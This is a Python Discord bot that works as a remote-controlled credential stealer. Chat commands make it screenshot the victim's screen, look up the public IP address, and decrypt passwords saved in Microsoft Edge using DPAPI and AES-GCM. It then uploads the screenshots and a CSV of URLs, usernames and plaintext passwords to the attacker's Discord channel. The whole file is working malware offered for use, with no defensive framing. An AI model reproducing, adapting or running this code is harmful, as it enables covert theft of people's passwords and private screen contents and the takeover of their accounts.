import discord
from discord.ext import commands
import pyautogui


intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print("Bot is now online")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    # Use message.content to get the content of the message
    if message.content.startswith('!screenshot'):
        screenshot = pyautogui.screenshot()
        screenshot.save("ss.png")
        
        await message.channel.send("I am taking a screenshot, wait you lil monster")
        
        image_path = "ss.png"

        # Open the image file and create a discord.File object
        with open(image_path, 'rb') as f:
            image = discord.File(f)

            # Send the image as a message attachment
            await message.channel.send(file=image)

    if message.content.startswith('!IP'):
        await message.channel.send("Hacking the IPv4 adress, wait you lil monster")
        import requests
 
        def get_ip_address():
            url = 'https://api.ipify.org'
            response = requests.get(url)
            ip_address = response.text
            return ip_address
 
        # Call the function to get the IP address
        ip = get_ip_address()
        await message.channel.send("Hacked, here is the IPv4 addres")
        await message.channel.send(ip)
            
    if message.content.startswith("!grabpassword"):
        await message.channel.send("Hacking passwords, wait you lil monster")
        import os
        import re
        import sys
        import json
        import base64
        import sqlite3
        import win32crypt
        from Cryptodome.Cipher import AES
        import shutil
        import csv

        #GLOBAL CONSTANT
        EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
        EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))
        def get_secret_key():
            try:
                #(1) Get secretkey from chrome local state
                with open( EDGE_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                #Remove suffix DPAPI
                secret_key = secret_key[5:] 
                secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
                return secret_key
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Chrome secretkey cannot be found")
                return None
    
        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)

        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)

        def decrypt_password(ciphertext, secret_key):
            try:
                #(3-a) Initialisation vector for AES decryption
                initialisation_vector = ciphertext[3:15]
                #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
                #Encrypted password is 192 bits
                encrypted_password = ciphertext[15:-16]
                #(4) Build the cipher to decrypt the ciphertext
                cipher = generate_cipher(secret_key, initialisation_vector)
                decrypted_pass = decrypt_payload(cipher, encrypted_password)
                decrypted_pass = decrypted_pass.decode()  
                return decrypted_pass
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
                return ""
                
        def get_db_connection(chrome_path_login_db):
            try:
                print(chrome_path_login_db)
                shutil.copy2(chrome_path_login_db, "Loginvault.db") 
                return sqlite3.connect("Loginvault.db")
            except Exception as e:
                print("%s"%str(e))
                print("[ERR] Chrome database cannot be found")
                return None
        
        if __name__ == '__main__':
            try:
                #Create Dataframe to store passwords
                with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                    csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                    csv_writer.writerow(["index","url","username","password"])
                    #(1) Get secret key
                    secret_key = get_secret_key()
                    #Search user profile or default folder (this is where the encrypted login password is stored)
                    folders = [element for element in os.listdir(EDGE_PATH) if re.search("^Profile*|^Default$",element)!=None]
                    for folder in folders:
                        #(2) Get ciphertext from sqlite database
                        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(EDGE_PATH,folder))
                        conn = get_db_connection(chrome_path_login_db)
                        if(secret_key and conn):
                            cursor = conn.cursor()
                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                            for index,login in enumerate(cursor.fetchall()):
                                url = login[0]
                                username = login[1]
                                ciphertext = login[2]
                                if(url!="" and username!="" and ciphertext!=""):
                                    #(3) Filter the initialisation vector & encrypted password from ciphertext 
                                    #(4) Use AES algorithm to decrypt the password
                                    decrypted_password = decrypt_password(ciphertext, secret_key)
                                    print("Sequence: %d"%(index))
                                    print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                                    print("*"*50)
                                    #(5) Save into CSV 
                                    csv_writer.writerow([index,url,username,decrypted_password])
                            #Close database connection
                            cursor.close()
                            conn.close()
                            #Delete temp login db
                            os.remove("Loginvault.db")
            except Exception as e:
                   
                

                print("[ERR] %s"%str(e))

            passwords_path = "decrypted_password.csv"
             # Open the image file and create a discord.File object
            with open(passwords_path, 'rb') as f:
                image = discord.File(f)

                # Send the image as a message attachment
                await message.channel.send(file=image)



# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot.run('YOUR YOKEN')
